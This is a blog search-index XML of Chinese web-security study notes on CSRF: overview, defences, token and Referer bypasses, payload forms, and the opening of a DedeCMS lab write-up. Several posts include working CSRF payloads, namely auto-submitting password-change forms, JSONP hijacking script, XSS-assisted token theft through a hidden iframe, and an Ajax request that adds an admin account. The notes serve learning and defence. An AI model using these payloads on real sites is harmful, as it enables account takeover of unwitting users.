<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>写在最前</title>
    <url>/2020/02/20/README/</url>
    <content><![CDATA[<hr>
<h1 id="写在最前"><a href="#写在最前" class="headerlink" title="写在最前"></a>写在最前</h1><h3 id="本-README-md-为此博客目录索引"><a href="#本-README-md-为此博客目录索引" class="headerlink" title="本 README.md 为此博客目录索引"></a>本 <strong>README.md</strong> 为此博客目录索引</h3><ul>
<li>Github：<a href="https://github.com/Tomassky" target="_blank" rel="noopener">https://github.com/Tomassky</a></li>
<li>Gmail：<a href="mailto:tomassky7@gamil.com" target="_blank" rel="noopener">tomassky7@gamil.com</a></li>
</ul>
<h2 id="Kali-Linux"><a href="#Kali-Linux" class="headerlink" title="Kali Linux"></a>Kali Linux</h2><ul>
<li><a href="https://tomassky.github.io/categories/Kali/" target="_blank" rel="noopener">Kali Linux笔记</a><ul>
<li><a href="https://www.aqniukt.com/course/83" target="_blank" rel="noopener">此笔记为安全牛苑房宏的Kali渗透测试课程</a></li>
</ul>
</li>
</ul>
<h2 id="Git"><a href="#Git" class="headerlink" title="Git"></a>Git</h2><ul>
<li><a href="https://tomassky.github.io/categories/Git/" target="_blank" rel="noopener">Git笔记</a><ul>
<li><a href="https://www.youtube.com/playlist?list=PLK2w-tGRdrj5jO9Y1k2iAPCw7iSo6YVdx" target="_blank" rel="noopener">此笔记为Youtube代码真香的Git教程</a></li>
</ul>
</li>
</ul>
<h2 id="Penetration-tools"><a href="#Penetration-tools" class="headerlink" title="Penetration tools"></a>Penetration tools</h2><ul>
<li><a href="https://tomassky.github.io/categories/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/" target="_blank" rel="noopener">渗透工具</a> </li>
</ul>
<h2 id="Operating-System"><a href="#Operating-System" class="headerlink" title="Operating System"></a>Operating System</h2><ul>
<li><a href="https://tomassky.github.io/categories/Operating-System/" target="_blank" rel="noopener">操作系统基础</a></li>
</ul>
<h2 id="IPS"><a href="#IPS" class="headerlink" title="IPS"></a>IPS</h2><ul>
<li><a href="https://tomassky.github.io/categories/IPS/" target="_blank" rel="noopener">IPS笔记</a><ul>
<li>此笔记为粤嵌袁盛智老师的IPS教程</li>
</ul>
</li>
</ul>
<h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><ul>
<li><a href="https://tomassky.github.io/categories/PHP/" target="_blank" rel="noopener">PHP笔记</a><ul>
<li>此笔记为B站黑马程序员的28天PHP零基础入门到精通教程（P1基础6天）</li>
<li>此笔记为传智播客的xindong的PHP基础教程</li>
</ul>
</li>
<li><a href="https://tomassky.github.io/categories/PHP/" target="_blank" rel="noopener">PHP学习</a><ul>
<li>此学习笔记来自各个网站包括PHP官方，PHP中文网，脚本之家</li>
</ul>
</li>
<li><a href="https://tomassky.github.io/categories/PHP/" target="_blank" rel="noopener">PHP实战</a><ul>
<li>此实战为应用所学，进行实践</li>
</ul>
</li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>CSRF--概要</title>
    <url>/2020/04/02/CSRF--%E6%A6%82%E8%A6%81/</url>
    <content><![CDATA[<hr>
<h4 id="1-简介"><a href="#1-简介" class="headerlink" title="1. 简介"></a>1. 简介</h4><ul>
<li>CSRF<ul>
<li>Cross-site request forgery跨站请求伪造，也被称为</li>
<li>“One Click Attack”</li>
<li>Session Riding</li>
<li>通常缩写为CSRF或者XSRF，是一种对网站的恶意利用。尽管听起来像跨站脚本（xss），但它与XSS非常不同，并且攻击方式几乎相左。XSS利用站点内的信任用户，而CSRF则通过伪装来自受信任用户的请求来利用受信任的网站。与XSS攻击相比，CSRF攻击往往不太流行（因此对其进行防范的资源也相当稀少）和难以防范，所以被认为比XSS更具危险</li>
</ul>
</li>
<li>CSRF与XSS的区别：CSRF是借用户的权限完成攻击，攻击者并没有拿到用户的权限，而XSS是直接盗取到了用户的权限，然后实施破坏</li>
<li>CSRF与XSS比较的流程<ul>
<li>受害者浏览恶意网站</li>
<li>恶意网站返回恶意HTML</li>
<li>恶意HTML通过受害者的浏览器访问正规网站，作攻击用请求（CSRF）</li>
<li>正规网站攻击用响应内容</li>
<li>受害者的电脑执行改变HTML的脚本（XSS）</li>
<li>▲ CSRF是指恶意使用服务器对步骤三中请求的处理</li>
<li>▲ XSS的情况下，步骤三的请求中包含的脚本则被原封不动地响应四地形式返回，随后该恶意脚本在用户的浏览器中被执行</li>
</ul>
</li>
</ul>
<h4 id="2-手工挖掘"><a href="#2-手工挖掘" class="headerlink" title="2. 手工挖掘"></a>2. 手工挖掘</h4><ul>
<li>一个网站对关键信息（比如密码等敏感信息）的操作(增删改)是否容易被伪造<ul>
<li>修改管理员账号使，不需要验证旧密码</li>
<li>对于敏感信息的修改并没有使用安全的token验证</li>
</ul>
</li>
<li>确认凭证的有效期<ul>
<li>虽然退出或者关闭了浏览器，但cookie仍然有效，或者session没有及时过期</li>
</ul>
</li>
</ul>
<h4 id="3-工具挖掘"><a href="#3-工具挖掘" class="headerlink" title="3. 工具挖掘"></a>3. 工具挖掘</h4><ul>
<li>挖掘工具<ul>
<li>netspark</li>
<li>AWVS</li>
<li>appscan</li>
<li>burp</li>
</ul>
</li>
</ul>
<h4 id="4-漏洞存在的场景"><a href="#4-漏洞存在的场景" class="headerlink" title="4. 漏洞存在的场景"></a>4. 漏洞存在的场景</h4><ul>
<li>产生地点<ul>
<li>仅使用Cookie进行会话管理的网站</li>
<li>仅依靠HTTP认证、SSL客户端证书、手机的移动ID来识别用户的网站</li>
</ul>
</li>
<li>影响范围<ul>
<li>存在CSRF漏洞的页面</li>
</ul>
</li>
<li>影响类型<ul>
<li>以受害用户的权限来执行关键处理。如购买商品、发布帖子、更改密码等</li>
</ul>
</li>
<li>影响程度<ul>
<li>中~大</li>
</ul>
</li>
<li>用户参与程度<ul>
<li>需要 -&gt; 点击恶意链接、浏览恶意网站等</li>
</ul>
</li>
<li>对策概要<ul>
<li>执行关键处理，确认是正规用户发起的请求</li>
</ul>
</li>
<li>具体地点<ul>
<li>咨询内容站点，视频类站点，后台管理系统，企业路由，家用路由，智能家居等的后台系统。WEB邮箱，论坛，留言系统，客户端等等</li>
<li>具有典型的代表有：wordpress、joomla、youtube、twitter、facebook、gmail、yahoo、aol、客户端（telegram、wechat、weibo）等</li>
</ul>
</li>
</ul>
<h4 id="5-“输入-执行”模式的CSRF攻击"><a href="#5-“输入-执行”模式的CSRF攻击" class="headerlink" title="5. “输入-执行”模式的CSRF攻击"></a>5. “输入-执行”模式的CSRF攻击</h4><ul>
<li>使用POST方法请求修改密码的网页</li>
<li>保持网页登陆状态</li>
<li>使用POST参数中来指定新密码</li>
</ul>
<pre><code>&lt;body onload=&quot;document.forms[0].submit()&quot;&gt;
&lt;form action=&quot;http://....&quot; method=&quot;POST&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;pwd&quot; value=&quot;cracked&quot;&gt;
&lt;/form&gt;
&lt;/body&gt;</code></pre><ul>
<li>流程<ul>
<li>用户登陆example.jp</li>
<li>攻击者设下圈套</li>
<li>受害人浏览恶意网站而触发圈套</li>
<li>攻击者使用恶意网站中的JavaScript，使受害人的浏览器向攻击对象网站发送讲密码变更为cracked的POST请求</li>
<li>密码被修改</li>
</ul>
</li>
<li>iframe结合<ul>
<li>攻击者在实际发动攻击时，为了使攻击显得隐蔽，通常会采用不可见的iframe来布置网页</li>
<li>但会受到同源策略的影响，这时可能需要结合XSS漏洞来实现</li>
</ul>
</li>
</ul>
<h4 id="6-存在确认页面的CSRF攻击"><a href="#6-存在确认页面的CSRF攻击" class="headerlink" title="6. 存在确认页面的CSRF攻击"></a>6. 存在确认页面的CSRF攻击</h4><ul>
<li>输入页面与执行页面之间包含确认页面时的情况</li>
<li>确认页面讲数据传递给执行页面的方法<ul>
<li>使用hidden参数（type属性为hidden的input元素）</li>
<li>使用会话变量</li>
</ul>
</li>
<li>使用hidden参数传递参数<ul>
<li>此模式下的CSRF攻击手段与没有确认页面时的情况相同</li>
<li>多加一个form表单，多加一个点击按钮</li>
</ul>
</li>
</ul>
<pre><code>//使用hidden参数传递参数
输入页面：POST
&lt;input type=&quot;text&quot; name=&quot;mail&quot; value=&quot;foo@example.jp&quot;&gt;

确认页面：hidden参数
&lt;input type=&quot;hidden&quot; name=&quot;mail&quot; value=&quot;foo@example.jp&quot;&gt;

执行页面:执行更改成功</code></pre><ul>
<li>使用会话变量传递参数<ul>
<li>向确认页面发送POST请求，使邮箱地址保存到会话变量中（iframe1）</li>
<li>伺机打开执行页面（iframe2）</li>
<li>过程：iframe1与恶意网站同时打开，并向确认页面发送含有邮箱地址的POST请求，这样一来邮箱地址就被保存到了会话变量中，在恶意网站打开10秒后，iframe2打开执行页面并完成CSRF攻击。这时，由于邮箱地址已被设置到会话变量中，因此邮箱地址就被更改为了攻击者所指定的邮箱地址，攻击就成功了</li>
</ul>
</li>
</ul>
<pre><code>//使用会话变量传递参数
输入页面：POST
&lt;input type=&quot;text&quot; name=&quot;mail&quot; value=&quot;foo@example.jp&quot;&gt;

确认页面：讲邮箱地址保存至会话变量
$_SESSION[&#39;mail&#39;]=$_POST[&#39;mail&#39;];

执行界面：从会话变量中获取邮箱地址
$mail=$_SESSION[&#39;mail&#39;];</code></pre><ul>
<li>▲ 有些应用采用向导的形式，要经过多个步骤才到达最后的执行页面，这种情况下，只需添加iframe的数量就照样能够实施攻击</li>
<li>▲ 内部网络（局域网）的服务器同样也会成为攻击目标</li>
</ul>
<h4 id="7-JSON劫持"><a href="#7-JSON劫持" class="headerlink" title="7. JSON劫持"></a>7. JSON劫持</h4><ul>
<li>站点：<a href="http://vulnerable.shiyousan.com/Home/GetJson" target="_blank" rel="noopener">http://vulnerable.shiyousan.com/Home/GetJson</a></li>
<li>通过GET请求，就能获得一组敏感的数据</li>
<li>利用<ul>
<li>利用CSRF的方式，恶意诱导人点击</li>
<li>形成JSON敏感信息劫持</li>
</ul>
</li>
<li>▲ JSON劫持本质是CSRF攻击，未对来源进行验证</li>
</ul>
<h4 id="8-JSONP劫持"><a href="#8-JSONP劫持" class="headerlink" title="8. JSONP劫持"></a>8. JSONP劫持</h4><ul>
<li>▲ JSONP劫持其实是跨域版本的JSON劫持</li>
<li>站点：<a href="http://vulnerable.shiyousan.com/Home/GetJson?callback=v" target="_blank" rel="noopener">http://vulnerable.shiyousan.com/Home/GetJson?callback=v</a></li>
<li>通过GET请求，就能获得一组敏感的数据</li>
<li>利用<ul>
<li>利用CSRF的方式，恶意诱导人点击</li>
<li>形成JSON敏感信息劫持</li>
</ul>
</li>
<li>▲ JSONP劫持本质是CSRF攻击，未对来源进行验证</li>
<li>JSONP劫持和JSON的区别<ul>
<li>callback参数，这个是回调参数的命名，需要去首先得知</li>
<li>v值，可以为构造的回调函数，用来接收JSON数据</li>
</ul>
</li>
<li>利用代码</li>
</ul>
<pre><code>&lt;script type=&quot;text/javascript&quot;&gt;
function v(result)
{
    alert(result.name);
}
&lt;/script&gt;
&lt;script type=&quot;text/javascript&quot; src=&quot;http://vulnerable.shiyousan.com/Home/GetJson?callback=v&quot;&gt;&lt;/script&gt;</code></pre><h4 id="9-若要再深入研究CSRF"><a href="#9-若要再深入研究CSRF" class="headerlink" title="9. 若要再深入研究CSRF"></a>9. 若要再深入研究CSRF</h4><ul>
<li>JSON劫持</li>
<li>跨域劫持<ul>
<li>JSONP劫持</li>
<li>Flash劫持</li>
<li>CORS劫持 -&gt; Origin头的无效判断 -&gt; 绕过 -&gt; 请求敏感信息</li>
<li>▲ 跨域劫持的问题，可看云服务器关于跨域的解说</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>CSRF</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>CSRF</tag>
      </tags>
  </entry>
  <entry>
    <title>CSRF--防范策略</title>
    <url>/2020/04/02/CSRF--%E9%98%B2%E8%8C%83%E7%AD%96%E7%95%A5/</url>
    <content><![CDATA[<hr>
<h4 id="1-对策"><a href="#1-对策" class="headerlink" title="1. 对策"></a>1. 对策</h4><ul>
<li>防御CSRF的关键为确认关键处理的请求确实是由正规用户自愿发送的<ul>
<li>筛选出需要防范CSRF攻击的页面</li>
<li>使代码有能力辨认是否是正规用户的自愿请求</li>
</ul>
</li>
<li>筛选出需要防范CSRF攻击的页面<ul>
<li>在需求分析阶段指定功能一览表，标记出需要执行CSRF防范策略的功能</li>
<li>在概要设计阶段制作页面跳转图，标记出需要执行CSRF防范策略的页面</li>
<li>在开发阶段实施CSRF防范策略</li>
</ul>
</li>
<li>使代码有能力辨认是否是正规用户的自愿请求<ul>
<li>嵌入机密信息（令牌）</li>
<li>再次输入密码</li>
<li>检验Referer</li>
</ul>
</li>
<li>CSRF防范措施的比较</li>
</ul>
<p>|嵌入令牌|再次输入密码|确认Referer<br>:–:|:–:|:–:|:–:<br>开发耗时|中|中|小<br>对用户的影响|无|增加了输入密码的麻烦|关闭了Referer的用户无法正常使用<br>能否用于手机网站|可|可|不可<br>建议使用的地方|最基本的防御策略，所有情况均可使用|需要防范他人伪装或者确认需求很强的页面|用于能够限定用户环境的既有应用的CSRF防范策略</p>
<ul>
<li>辅助策略<ul>
<li>执行完关键操作后，可以向用户注册的邮箱发送有关处理内容的通知邮件</li>
<li>▲ 由于邮件是未经加密的明文传输，因此，最好不要在邮件中添加重要信息，而只是通知用户有人恶意执行了关键处理。而如果用户想要了解详情的话，可以登陆Web应用查看购买力是或发送历史等内容</li>
</ul>
</li>
</ul>
<h4 id="2-验证HTTP-Referer、Origin字段"><a href="#2-验证HTTP-Referer、Origin字段" class="headerlink" title="2. 验证HTTP Referer、Origin字段"></a>2. 验证HTTP Referer、Origin字段</h4><ul>
<li>前提：正规请求与CSRF攻击请求的Referer字段的内容不同，正规请求中Referer的值应该为执行页面的上一个页面（输入页面或确认页面）</li>
<li>检验Referer的方式<ul>
<li>对不发送Referer用户的处理</li>
<li>相对路径要修改为绝对路径URL，包括域名后的/</li>
</ul>
</li>
<li>▲ 通过Referer来防范CSRF漏洞的方法，其适用范围应该被限定在对公司的内部系统等能够限定用户环境的既有应用实施安全隐患对策的情况</li>
</ul>
<pre><code>//没有对不发送Referer用户的处理  -&gt; 关闭Referer无法操作
if(preg_match(&#39;#\Ahttp://example\.jp/xxx\.php#&#39;,@$_SERVER[&#39;HTTP_REFERER&#39;])!==1){
    die(&#39;请从正规的页面进行操作&#39;);
}

//没有对域名后面的/进行检验  -&gt;  绕过的URL：http://example.jp.trap.example.com/tarp.html
if(preg_match(&#39;#\Ahttp://example\.jp#&#39;,@$_SERVER[&#39;HTTP_REFERER&#39;])!==1){
    die(&#39;请从正规的页面进行操作&#39;);
}</code></pre><ul>
<li>通过检测请求报文中的Origin、Referer来判断属于哪一个域名/地址</li>
</ul>
<pre><code>// 验证Referer字段
if($_GET[&quot;act&quot;]) 
{ 
if(isset($_SERVER[&quot;HTTP_REFERER&quot;])) 
{ 
$serverhost = $_SERVER[&quot;SERVER_NAME&quot;]; 
$strurl = str_replace(&quot;http://&quot;,&quot;&quot;,$_SERVER[&quot;HTTP_REFERER&quot;]); 
$strdomain = explode(&quot;/&quot;,$strurl); 
$sourcehost = $strdomain[0]; 
if(strncmp($sourcehost, $serverhost, strlen($serverhost))) 
{
unset($_POST); 
echo &quot;&quot;; 
echo &quot;alert(‘数据来源异常!’);&quot;; 
echo &quot; location=’index.php’;&quot;;
echo &quot;&quot;; 
}</code></pre><h4 id="3-在请求地址中添加-token-并验证"><a href="#3-在请求地址中添加-token-并验证" class="headerlink" title="3. 在请求地址中添加 token 并验证"></a>3. 在请求地址中添加 token 并验证</h4><ul>
<li>对关键操作增加token参数，token值必须随机，每次都不一样</li>
<li>如果访问需防范CSRF的页面（登陆页面、订单确认页面等）时需要提供第三方无法得知的机密信息的话，那么即使出现非正规用户自愿发送的请求，应用端也能够通过判断得知请求是否合法，用于此目的的机密信息被成为Token</li>
<li>接收令牌的请求（接收关键处理的请求）必须为POST方法。若使用GET方法发送机密信息的话，令牌信息就有可能通过Referer泄露出去</li>
<li>▲ 会话ID是一种既简单又安全的令牌的实现方法</li>
<li>一次性令牌<ul>
<li>用于防范重放攻击（Replay Attack）</li>
<li>需要密码学级别的伪随机数生成器</li>
</ul>
</li>
</ul>
<h4 id="4-在HTTP头中自定义属性并验证"><a href="#4-在HTTP头中自定义属性并验证" class="headerlink" title="4. 在HTTP头中自定义属性并验证"></a>4. 在HTTP头中自定义属性并验证</h4><ul>
<li>把token以参数的形式置于HTTP请求之中，而是把它放到HTTP头中自定义的属性里</li>
<li>过 XMLHttpRequest这个类，可以一次性给所有该类请求加上csrftoken这个HTTP头属性，并把token值放入其中</li>
<li>优点：XMLHttpRequest请求的地址不会被记录到浏览器的地址栏，token不会透过Referer泄露到其他网站中去</li>
<li>缺点：XMLHttpRequest请求通常用于Ajax方法中对于页面局部的异步刷新，并非所有的请求都适合用这个类来发起，且重构网站，代价很大</li>
</ul>
<h4 id="5-对敏感信息的操作实施安全的逻辑流程"><a href="#5-对敏感信息的操作实施安全的逻辑流程" class="headerlink" title="5. 对敏感信息的操作实施安全的逻辑流程"></a>5. 对敏感信息的操作实施安全的逻辑流程</h4><ul>
<li>修改密码时，需要先校验旧密码</li>
<li>敏感信息的修改使用post，而不是get</li>
<li>一般在登录时候，也可以在其他重要信息操作的表单&lt;要考虑到可用性&gt;  </li>
</ul>
<h4 id="6-安全的会话管理，避免会话被利用"><a href="#6-安全的会话管理，避免会话被利用" class="headerlink" title="6. 安全的会话管理，避免会话被利用"></a>6. 安全的会话管理，避免会话被利用</h4><ul>
<li>不在客户端保存敏感信息，比如身份认证信息</li>
<li>测试直接关闭</li>
<li>设置会话过期机制，比如15分钟内无操作，则自动登录超时</li>
</ul>
<h4 id="7-再次输入密码"><a href="#7-再次输入密码" class="headerlink" title="7. 再次输入密码"></a>7. 再次输入密码</h4><ul>
<li>让用户再次输入密码，也是用来确认请求是否由用户自愿发起的一种方法</li>
<li>用于其他目的<ul>
<li>在用户下订单之前，再次向用户确认购买意向</li>
<li>能够确认此时在电脑前操作的确实是用户本人</li>
</ul>
</li>
<li>▲ 对于其他的页面（如注销处理）来说，让用户再次输入密码，反而会降低应用的易用性</li>
</ul>
]]></content>
      <categories>
        <category>CSRF</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>CSRF</tag>
      </tags>
  </entry>
  <entry>
    <title>CSRF--Token绕过</title>
    <url>/2020/04/02/CSRF--Token%E7%BB%95%E8%BF%87/</url>
    <content><![CDATA[<hr>
<h4 id="1-结合XSS漏洞"><a href="#1-结合XSS漏洞" class="headerlink" title="1. 结合XSS漏洞"></a>1. 结合XSS漏洞</h4><ul>
<li>背景：信息的修改需要带上一个服务器段修改的Token，且每次刷新，Token都会发生改变</li>
<li>绕过方法：结合XSS漏洞<ul>
<li>找到同站点内一个有XSS漏洞的站点</li>
<li>往XSS漏洞里面注入下面的代码<ul>
<li>attach()函数用于获取user_token</li>
<li>一个iframe标签用于隐藏访问获取一个Token</li>
<li>一个form表单用于将修改的密码与Token进行提交数据库</li>
</ul>
</li>
</ul>
</li>
<li>结合XSS漏洞的原因<ul>
<li>单独在外面使用js文件，会存在同源策略的问题</li>
<li>简化版抓取Token：<code>&lt;iframe src=&quot;../csrf&quot; onload=alert(frames[0].document.getElenentsByName(&#39;user_token&#39;)[0].value)&gt;</code></li>
</ul>
</li>
</ul>
<pre><code>&lt;script type=&quot;text/javascript&quot;&gt;
function attack(){

    document.getElementsByName(&#39;user_token&#39;)[0].value=document.getElementById(&quot;hack&quot;).contentWindow.document.getElementsByName(&#39;user_token&#39;)[0].value;

    document.getElementById(&quot;transfer&quot;).submit();
}
&lt;/script&gt;

&lt;iframe src=&quot;http://192.168.0.109/xxx&quot; id=&quot;hack&quot; border=&quot;0&quot; style=&quot;display:none;&quot;&gt;
&lt;/iframe&gt;

&lt;body onload=&quot;attack()&quot;&gt;

&lt;form method=&quot;GET&quot; id=&quot;transfer&quot; action=&quot;http://192.168.0.109/xxx&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;password_new&quot; value=&quot;password&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;password_conf&quot; value=&quot;password&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;user_token&quot; value=&quot;&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;Change&quot; value=&quot;Change&quot;&gt;
&lt;/form&gt;
&lt;/body&gt;</code></pre><h4 id="2-论坛网站"><a href="#2-论坛网站" class="headerlink" title="2. 论坛网站"></a>2. 论坛网站</h4><ul>
<li>在一些论坛之类支持用户自己发表内容的网站，黑客可以在上面发布自己个人网站的地址。由于系统也会在这个地址后面加上token，黑客可以在自己的网站上得到这个token，并马上就可以发动CSRF攻击</li>
</ul>
<h4 id="3-JSON数据去POST作为Token"><a href="#3-JSON数据去POST作为Token" class="headerlink" title="3. JSON数据去POST作为Token"></a>3. JSON数据去POST作为Token</h4><ul>
<li>前提：无对Token的检测</li>
<li>利用：可以任意构造Token进行绕过</li>
<li>▲ 具体细节见云服务器上关于JSON CSRF的一些思考</li>
</ul>
<h4 id="4-使用JSONP跨域去请求Token"><a href="#4-使用JSONP跨域去请求Token" class="headerlink" title="4. 使用JSONP跨域去请求Token"></a>4. 使用JSONP跨域去请求Token</h4><ul>
<li>前提<ul>
<li>请求是不检查Referer</li>
<li>使用JSONP去跨域生成Token</li>
<li>回传参数可以得出，默认为callback</li>
<li>能够fuzz出一定回调参数的值</li>
</ul>
</li>
<li>利用：构造callback的值，发送JSONP请求，获取Token，进行表单构造利用，引诱点击<ul>
<li>▲ Token的值也可能与其他参数有关</li>
</ul>
</li>
<li>▲ 具体细节见云服务器上分享一个jsonp劫持造成的新浪某社区CSRF蠕虫</li>
</ul>
]]></content>
      <categories>
        <category>CSRF</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>CSRF</tag>
      </tags>
  </entry>
  <entry>
    <title>CSRF--Referer绕过</title>
    <url>/2020/04/02/CSRF--Referer%E7%BB%95%E8%BF%87/</url>
    <content><![CDATA[<hr>
<h4 id="1-添加无Referer标签"><a href="#1-添加无Referer标签" class="headerlink" title="1. 添加无Referer标签"></a>1. 添加无Referer标签</h4><ul>
<li>逻辑刚好没判断无Referer的情况</li>
<li><code>&lt;meta name=&quot;referrer&quot; content=&quot;never&quot;&gt;</code></li>
</ul>
<pre><code>&lt;html&gt;
  &lt;meta name=&quot;referrer&quot; content=&quot;never&quot;&gt;
  &lt;body&gt;
  &lt;script&gt;history.pushState(&#39;&#39;, &#39;&#39;, &#39;/&#39;)&lt;/script&gt;  &lt;!-- 实现浏览器页面不刷新修改url链接 --&gt;
    &lt;form action=&quot;http://www.baidu.com/setProfile&quot; method=&quot;POST&quot;&gt;
      &lt;input type=&quot;hidden&quot; name=&quot;nickname&quot; value=&quot;new22&quot; /&gt;
      &lt;input type=&quot;hidden&quot; name=&quot;email&quot; value=&quot;1&amp;#64;1&amp;#46;com&quot; /&gt;
      &lt;input type=&quot;hidden&quot; name=&quot;team&quot; value=&quot;new22&quot; /&gt;
      &lt;input type=&quot;hidden&quot; name=&quot;address&quot; value=&quot;new33&quot; /&gt;
      &lt;input type=&quot;submit&quot; value=&quot;Submit request&quot; /&gt;
    &lt;/form&gt;
  &lt;/body&gt;
&lt;/html&gt;</code></pre><h4 id="2-简单对字段的判断"><a href="#2-简单对字段的判断" class="headerlink" title="2. 简单对字段的判断"></a>2. 简单对字段的判断</h4><ul>
<li>校验只是判断是否包含</li>
<li>如<code>stripos( $_SERVER[ &#39;HTTP_REFERER&#39; ] ,$_SERVER[ &#39;SERVER_NAME&#39; ])</code></li>
<li>这时候Referer中只需要含有Host的头的内容即可</li>
</ul>
<h4 id="3-有Referer，但无对Referer的检测"><a href="#3-有Referer，但无对Referer的检测" class="headerlink" title="3. 有Referer，但无对Referer的检测"></a>3. 有Referer，但无对Referer的检测</h4>]]></content>
      <categories>
        <category>CSRF</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>CSRF</tag>
      </tags>
  </entry>
  <entry>
    <title>CSRF--Payload形式</title>
    <url>/2020/04/02/CSRF--Payload%E5%BD%A2%E5%BC%8F/</url>
    <content><![CDATA[<hr>
<h4 id="1-构造链接"><a href="#1-构造链接" class="headerlink" title="1. 构造链接"></a>1. 构造链接</h4><ul>
<li><a href="http://192.168.0.109/xxxxx/?password_new=test&amp;password_conf=test&amp;Change=Change#" target="_blank" rel="noopener">http://192.168.0.109/xxxxx/?password_new=test&amp;password_conf=test&amp;Change=Change#</a></li>
<li>当受害者点击了这个链接，他的密码就会被改成test</li>
<li>▲ CSRF最关键的是利用受害者的cookie向服务器发伪造请求，所以如果受害者之前用Chrome浏览器登录的这个系统，而用搜狗浏览器点击这个链接，攻击是不会触发的，因为搜狗浏览器并不能利用Chrome浏览器的cookie，所以会自动跳转到登录界面</li>
</ul>
<h4 id="2-使用短链接来隐藏URL"><a href="#2-使用短链接来隐藏URL" class="headerlink" title="2. 使用短链接来隐藏URL"></a>2. 使用短链接来隐藏URL</h4><ul>
<li><a href="http://dwz.cn/" target="_blank" rel="noopener">http://dwz.cn/</a>….</li>
<li>实际攻击场景下只要目标服务器的域名不是ip，是可以生成相应短链接的.</li>
<li>但受害者最终还是会看到密码修改成功的页面，所以这种攻击方法也不适合现实生活</li>
</ul>
<h4 id="3-构造攻击页面"><a href="#3-构造攻击页面" class="headerlink" title="3. 构造攻击页面"></a>3. 构造攻击页面</h4><ul>
<li>现实攻击场景下，这种方法需要事先在公网上传一个攻击页面，诱骗受害者去访问，真正能够在受害者不知情的情况下完成</li>
<li>当受害者访问攻击页面时，会误认为是自己点击的是一个失效的url，实际上已经遭受了CSRF攻击，密码已经被修改了</li>
<li>▲ form标点提交参数后页面会进行跳换，可以通过内嵌iframe方式可以阻止页面跳转</li>
</ul>
<pre><code>&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;body onload=&quot;javascript:csrf()&quot;&gt;
&lt;script&gt;
    function csrf(){
        document.getElementById(&quot;button&quot;).click();
    }
&lt;/script&gt;
&lt;style&gt;
   form{
        display: none;
   }
&lt;/style&gt;
    &lt;form action=&quot;http://127.0.0.1/xxx/&quot;&gt;
        &lt;input type=&quot;hidden&quot; name=&quot;password_new&quot; value=&quot;hacker&quot;&gt;
        &lt;input type=&quot;hidden&quot; name=&quot;password_conf&quot; value=&quot;hacker&quot;&gt;
        &lt;input type=&quot;hidden&quot; name=&quot;Change&quot; value=&quot;Change&quot;&gt;
        &lt;input type=&quot;submit&quot; value=&quot;Click Me&quot;&gt;
    &lt;/form&gt;
&lt;/body&gt;
&lt;/html&gt;</code></pre><h4 id="4-结合XSS漏洞的Ajax请求"><a href="#4-结合XSS漏洞的Ajax请求" class="headerlink" title="4. 结合XSS漏洞的Ajax请求"></a>4. 结合XSS漏洞的Ajax请求</h4><ul>
<li>找到同站点内一个有XSS漏洞的站点</li>
<li>往站点里面插入下列构造的ajax，等待管理员触发</li>
<li>▲ 结合具体的数据包来构造ajax代码</li>
</ul>
<pre><code>var xmlhttp;
if(window.XMLHttpRequest){
  xmlhttp=new XMLHttpRequest();
  }else{
  xmlhttp=new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);
  }
xmlhttp.open(&quot;POST&quot;,&quot;/xxx?act=add&quot;,true);
xmlhttp.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);
xmlhttp.send(&quot;admin=123&amp;password=admin&amp;password3=admin&amp;button=提交数据&quot;);</code></pre><h4 id="5-内容来源"><a href="#5-内容来源" class="headerlink" title="5. 内容来源"></a>5. 内容来源</h4><ul>
<li>▲ 本节内容来自部分来自婷婷哈大佬和部分来自bmjoker大佬</li>
</ul>
]]></content>
      <categories>
        <category>CSRF</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>CSRF</tag>
      </tags>
  </entry>
  <entry>
    <title>CSRF靶场--封神台</title>
    <url>/2020/04/02/CSRF%E9%9D%B6%E5%9C%BA--%E5%B0%81%E7%A5%9E%E5%8F%B0/</url>
    <content><![CDATA[<hr>
<h4 id="1-CSRF"><a href="#1-CSRF" class="headerlink" title="1. CSRF"></a>1. CSRF</h4><ul>
<li>点开题目链接，审计一下题目<ul>
<li>flag就在网站根目录 -&gt; 盲猜需要用到文件包含的思路</li>
<li>后台密码为admin123<ul>
<li>这么说需要找到后台，联想到本次作业为CSRF，登陆后台，借助管理员的Cookie就成立了</li>
<li>后台密码为admin123，盲猜用户名为admin或者root</li>
</ul>
</li>
</ul>
</li>
</ul>
<p><img src="/images/csrf/dedecms/csrf-name.png" srcset="/img/loading.gif" alt="csrf-name"></p>
<ul>
<li>点开链接<ul>
<li>发现没有什么东西，网站目录也不是在根目录</li>
<li>右键查看源代码，ctrl+f搜索dedecms，可以发现dedecms的版本</li>
</ul>
</li>
</ul>
<p><img src="/images/csrf/dedecms/csrf-version.png" srcset="/img/loading.gif" alt="csrf-version"></p>
<ul>
<li>百度搜索dedecms，大多都是DedeCMS V57_UTF8_SP2版本的（真多漏洞）</li>
<li>DedeCMS-V5.7_UTF8_SP1版本的，SQL注入，文件包含<ul>
<li>只关心文件包含getshell的</li>
</ul>
</li>
<li>发现一个CSDN上的链接<br>(weixin_33921089大佬的链接)[<a href="https://blog.csdn.net/weixin_33921089/article/details/93246790?depth_1-utm_source=distribute.pc_relevant.none-task&amp;utm_source=distribute.pc_relevant.none-task]" target="_blank" rel="noopener">https://blog.csdn.net/weixin_33921089/article/details/93246790?depth_1-utm_source=distribute.pc_relevant.none-task&amp;utm_source=distribute.pc_relevant.none-task]</a></li>
<li>分析源码可知，漏洞在/dede/sys_verifies.php下<ul>
